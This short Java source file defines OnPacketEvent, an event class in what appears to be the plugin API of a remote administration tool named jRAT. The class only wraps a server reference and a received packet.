package org.jrat.project.api.events;

import org.jrat.project.api.Packet;
import org.jrat.project.api.RATServer;

public class OnPacketEvent extends RATServerEvent {

	private final Packet packet;

	public OnPacketEvent(RATServer server, Packet packet) {
		super(server);
		this.packet = packet;
	}

	public Packet getPacket() {
		return packet;
	}

}
